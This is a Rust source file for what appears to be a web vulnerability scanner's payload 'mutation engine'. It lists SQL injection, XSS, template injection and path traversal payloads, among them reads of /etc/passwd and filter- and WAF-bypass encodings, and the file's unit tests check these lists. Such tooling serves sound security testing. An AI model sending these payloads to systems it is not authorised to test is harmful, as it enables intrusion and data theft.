// Advanced Mutation Engine - Intelligent payload generation and variation
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Payload {
    pub original: String,
    pub encoded: String,
    pub technique: PayloadTechnique,
    pub priority: f64,
    pub encoding_method: EncodingMethod,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PayloadTechnique {
    Union,
    Boolean,
    TimeBased,
    ErrorBased,
    Blind,
    OutOfBand,
    SecondOrder,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EncodingMethod {
    None,
    UrlEncoding,
    HtmlEncoding,
    DoubleUrlEncoding,
    Unicode,
    Base64,
    HexEncoding,
}

pub struct MutationEngine;

impl MutationEngine {
    /// Generate SQLi payloads with multiple techniques
    pub fn generate_sqli_payloads() -> Vec<Payload> {
        vec![
            // UNION-based
            Payload {
                original: "' UNION SELECT NULL--".to_string(),
                encoded: "'%20UNION%20SELECT%20NULL--".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.95,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            Payload {
                original: "' UNION SELECT NULL,NULL--".to_string(),
                encoded: "'%20UNION%20SELECT%20NULL%2CNULL--".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.90,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // Boolean-based
            Payload {
                original: "' AND '1'='1".to_string(),
                encoded: "'%20AND%20'1'%3D'1".to_string(),
                technique: PayloadTechnique::Boolean,
                priority: 0.85,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            Payload {
                original: "' AND '1'='2".to_string(),
                encoded: "'%20AND%20'1'%3D'2".to_string(),
                technique: PayloadTechnique::Boolean,
                priority: 0.85,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // Time-based
            Payload {
                original: "' AND SLEEP(5)--".to_string(),
                encoded: "'%20AND%20SLEEP(5)--".to_string(),
                technique: PayloadTechnique::TimeBased,
                priority: 0.80,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // Error-based
            Payload {
                original: "' AND extractvalue(1,concat(0x7e,version()))--".to_string(),
                encoded: "'%20AND%20extractvalue(1%2Cconcat(0x7e%2Cversion()))--"
                    .to_string(),
                technique: PayloadTechnique::ErrorBased,
                priority: 0.75,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // WAF bypass
            Payload {
                original: "1' /*!50000UNION*/ SELECT NULL--".to_string(),
                encoded: "1'%20%2F*%2150000UNION*%2F%20SELECT%20NULL--".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.70,
                encoding_method: EncodingMethod::UrlEncoding,
            },
        ]
    }

    /// Generate XSS payloads
    pub fn generate_xss_payloads() -> Vec<Payload> {
        vec![
            // Basic script injection
            Payload {
                original: "<script>alert(1)</script>".to_string(),
                encoded: "%3Cscript%3Ealert(1)%3C/script%3E".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.90,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // Event handler
            Payload {
                original: "<img src=x onerror=alert(1)>".to_string(),
                encoded: "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.95,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // SVG-based
            Payload {
                original: "<svg onload=alert(1)>".to_string(),
                encoded: "%3Csvg%20onload%3Dalert(1)%3E".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.90,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // Data URI
            Payload {
                original: "javascript:alert(1)".to_string(),
                encoded: "javascript%3Aalert(1)".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.85,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // Double encoding bypass
            Payload {
                original: "%3Cscript%3Ealert(1)%3C/script%3E".to_string(),
                encoded: "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.75,
                encoding_method: EncodingMethod::DoubleUrlEncoding,
            },
            // Case variation
            Payload {
                original: "<ScRiPt>alert(1)</sCrIpT>".to_string(),
                encoded: "%3CScRiPt%3Ealert(1)%3C/sCrIpT%3E".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.70,
                encoding_method: EncodingMethod::UrlEncoding,
            },
        ]
    }

    /// Generate SSTI payloads
    pub fn generate_ssti_payloads() -> Vec<Payload> {
        vec![
            // Jinja2/Jinja
            Payload {
                original: "{{7*7}}".to_string(),
                encoded: "%7B%7B7*7%7D%7D".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.95,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            Payload {
                original: "{{config}}".to_string(),
                encoded: "%7B%7Bconfig%7D%7D".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.90,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // ERB (Ruby)
            Payload {
                original: "<%= 7*7 %>".to_string(),
                encoded: "%3C%25%3D%207*7%20%25%3E".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.85,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            // Smarty
            Payload {
                original: "{$smarty.version}".to_string(),
                encoded: "%7B$smarty.version%7D".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.80,
                encoding_method: EncodingMethod::UrlEncoding,
            },
        ]
    }

    /// Generate Path Traversal payloads
    pub fn generate_path_traversal_payloads() -> Vec<Payload> {
        vec![
            Payload {
                original: "../../../../etc/passwd".to_string(),
                encoded: "..%2F..%2F..%2F..%2Fetc%2Fpasswd".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.90,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            Payload {
                original: "..\\..\\..\\windows\\win.ini".to_string(),
                encoded: "..%5C..%5C..%5Cwindows%5Cwin.ini".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.85,
                encoding_method: EncodingMethod::UrlEncoding,
            },
            Payload {
                original: "....//....//....//etc/passwd".to_string(),
                encoded: "....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd".to_string(),
                technique: PayloadTechnique::Union,
                priority: 0.80,
                encoding_method: EncodingMethod::UrlEncoding,
            },
        ]
    }

    /// Generate request variations for a payload
    pub fn generate_variations(payload: &str) -> Vec<String> {
        let mut variations = HashSet::new();

        // Original
        variations.insert(payload.to_string());

        // URL encoded
        variations.insert(urlencoding::encode(payload).to_string());

        // Double URL encoded
        variations.insert(
            urlencoding::encode(&urlencoding::encode(payload).to_string()).to_string(),
        );

        // Case variations
        if payload.len() < 50 {
            variations.insert(payload.to_uppercase());
            variations.insert(payload.to_lowercase());
        }

        // Hex encoding
        variations.insert(
            payload
                .as_bytes()
                .iter()
                .map(|b| format!("%{:02x}", b))
                .collect::<String>(),
        );

        variations.into_iter().collect()
    }

    /// Detect encoding method used in payload
    pub fn detect_encoding(payload: &str) -> EncodingMethod {
        if payload.contains("%") {
            if payload.contains("%25") {
                EncodingMethod::DoubleUrlEncoding
            } else {
                EncodingMethod::UrlEncoding
            }
        } else if payload.contains("&") && payload.contains(";") {
            EncodingMethod::HtmlEncoding
        } else if payload.contains("\\x") || payload.contains("\\u") {
            EncodingMethod::Unicode
        } else if payload.len() % 4 == 0
            && payload.chars().all(|c| c.is_alphanumeric() || c == '+' || c == '/' || c == '=')
        {
            EncodingMethod::Base64
        } else {
            EncodingMethod::None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sqli_payloads_generated() {
        let payloads = MutationEngine::generate_sqli_payloads();
        assert!(payloads.len() >= 7);
        assert!(payloads.iter().any(|p| p.priority > 0.8));
        assert!(payloads.iter().any(|p| matches!(p.technique, PayloadTechnique::Union)));
        assert!(payloads.iter().any(|p| matches!(p.technique, PayloadTechnique::Boolean)));
        assert!(payloads.iter().any(|p| matches!(p.technique, PayloadTechnique::TimeBased)));
    }

    #[test]
    fn test_xss_payloads_generated() {
        let payloads = MutationEngine::generate_xss_payloads();
        assert!(payloads.len() >= 6);
        assert!(payloads.iter().any(|p| p.original.contains("<script")));
        assert!(payloads.iter().any(|p| p.original.contains("onerror")));
    }

    #[test]
    fn test_ssti_payloads_generated() {
        let payloads = MutationEngine::generate_ssti_payloads();
        assert!(payloads.len() >= 4);
        assert!(payloads.iter().any(|p| p.original.contains("{{")));
    }

    #[test]
    fn test_path_traversal_payloads() {
        let payloads = MutationEngine::generate_path_traversal_payloads();
        assert!(payloads.len() >= 3);
        assert!(payloads.iter().any(|p| p.original.contains("../")));
    }

    #[test]
    fn test_payload_variations() {
        let payload = "test";
        let variations = MutationEngine::generate_variations(payload);
        assert!(variations.len() >= 3);
        assert!(variations.contains(&"test".to_string()));
        assert!(variations.iter().any(|v| v.contains("%")));
    }

    #[test]
    fn test_payload_variations_sqli() {
        let payload = "' OR '1'='1";
        let variations = MutationEngine::generate_variations(payload);
        assert!(variations.len() > 0);
        assert!(variations.contains(&payload.to_string()));
    }

    #[test]
    fn test_detect_url_encoding() {
        let encoded = "%3Cscript%3E";
        assert!(matches!(
            MutationEngine::detect_encoding(encoded),
            EncodingMethod::UrlEncoding
        ));
    }

    #[test]
    fn test_detect_double_url_encoding() {
        let encoded = "%253Cscript%253E";
        assert!(matches!(
            MutationEngine::detect_encoding(encoded),
            EncodingMethod::DoubleUrlEncoding
        ));
    }

    #[test]
    fn test_detect_hex_encoding() {
        let encoded = "%74%65%73%74"; // "test" in hex
        assert!(matches!(
            MutationEngine::detect_encoding(encoded),
            EncodingMethod::UrlEncoding
        ));
    }

    #[test]
    fn test_payload_priority_ordering() {
        let payloads = MutationEngine::generate_sqli_payloads();
        let mut prev_priority = 1.0;
        for payload in payloads.iter().take(3) {
            assert!(payload.priority <= prev_priority);
            prev_priority = payload.priority;
        }
    }

    #[test]
    fn test_xss_payload_priority() {
        let payloads = MutationEngine::generate_xss_payloads();
        let img_payload = payloads.iter().find(|p| p.original.contains("onerror"));
        assert!(img_payload.is_some());
        assert!(img_payload.unwrap().priority >= 0.90);
    }

    #[test]
    fn test_encoding_method_consistency() {
        let payload = MutationEngine::generate_xss_payloads()[0].clone();
        assert!(!payload.encoded.is_empty());
        assert_ne!(payload.encoded, payload.original);
    }
}
